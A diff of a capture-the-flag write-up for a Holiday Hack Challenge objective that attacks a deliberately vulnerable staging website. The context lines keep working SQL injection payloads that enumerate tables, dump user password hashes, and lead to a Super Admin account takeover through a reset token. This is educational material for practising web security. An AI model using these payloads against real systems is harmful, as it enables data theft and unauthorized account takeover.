@@ -1,6 +1,7 @@
 <h1 id="objective-12-frost-tower-website-checkup">Objective 12: Frost Tower Website Checkup</h1>
-<p><strong>Location: Studio, <a href="https://staging.jackfrosttower.com/">https://staging.jackfrosttower.com/</a></strong><br>
-<strong>Elf: Ingreta Tude</strong></p>
+<p><strong>Location: Studio, Frost Tower, 16<sup>th</sup> Floor, <a href="https://staging.jackfrosttower.com/">https://staging.jackfrosttower.com/</a></strong><br>
+<strong>Troll: Ingreta Tude</strong><br>
+<strong>Hints provided by Ribb Bonbowford after completion of <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/Elf%20Code%20Python.md">Elf Code Python</a></strong></p>
 <p>This objective is to perform a security assessment of the Frost Tower website with the <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">source code</a> being provided.<br>
 It has to be found, which job position Jack Frost plans to offer Santa on his todo list.</p>
 <h3 id="auth-flaw">Auth flaw</h3>
@@ -30,7 +31,7 @@ Furthermore it is important to note that “union” requires that the <strong>n
 <p>Rewritten for our SQLi flaw:</p>
 <pre><code>select * from (select 1)a1 join (select 2)a2 join (select F.3 from (select * from (select 1)i1 join (select 2)i2 join (select 3)i3 join (select 4)i4 join (select 5)i5 join (select 6)i6 join (select 7)i7 join (select 8)i8 join (select 9)i9 join (select 10)i10 join (select 11)i11 join (select 12)i12 join (select 13)i13 join (select 14)i14 join (select 15)i15 join (select 16)i16 join (select 17)i17 join (select 18)i18 join (select 19)i19 join (select 20)i20 join (select 21)i21 join (select 22)i22 join (select 23)i23 union select * from information_schema.tables)F)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
-<p>This reveals, that in addition to the tables “emails” and “uniquecontact”, which are known as they are  used in the application, there is an additional table “todo”, which seems to be the todo list we need access to.</p>
+<p>This reveals, that in addition to the tables “emails” and “uniquecontact”, which are known as they are used in the application, there is an additional table “todo”, which seems to be the todo list we need access to.</p>
 <p>Using the SQL statement</p>
 <pre><code>select * from information_schema.columns where table_name="todo"
 </code></pre>
@@ -56,6 +57,7 @@ The “note” column can then be extracted using</p>
 <li>SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide… so the whole world sees that Frost saved the Holiday Season!!! Bwahahahahaha!</li>
 <li>With Santa defeated, offer the old man a job as a <strong>clerk</strong> in the Frost Tower Gift Shop so we can keep an eye on him</li>
 </ul>
+<hr>
 <h3 id="bonus-getting-super-admin-privileges-in-the-application">Bonus: Getting Super Admin privileges in the application</h3>
 <p>Using the SQLi flaw, a full list of registered users and admins (along with password hashes and privilege levels) can be retrieved using this link:</p>
 <pre><code>https://staging.jackfrosttower.com/detail/461,id%20union%20select%20*%20from%20users--
@@ -104,6 +106,7 @@ Invalid date
     at tryRender (/app/node_modules/express/lib/application.js:640:10)
     at Function.render (/app/node_modules/express/lib/application.js:592:3)
 </code></pre>
-<p>Using the URL <a href="https://staging.jackfrosttower.com/forgotpass/token/">https://staging.jackfrosttower.com/forgotpass/token/</a><em>retrieved token</em> it is possible to set a new password for the “Super Admin” user.<br>
+<p>Using the URL <a href="https://staging.jackfrosttower.com/forgotpass/token/">https://staging.jackfrosttower.com/forgotpass/token/</a>{retrieved token} it is possible to set a new password for the “Super Admin” user.<br>
 Being logged on as this user, a new personalized user with “Super Admin” privileges can be created.</p>
+<p><strong>Achievement: Frost Tower Website Checkup</strong></p>
 
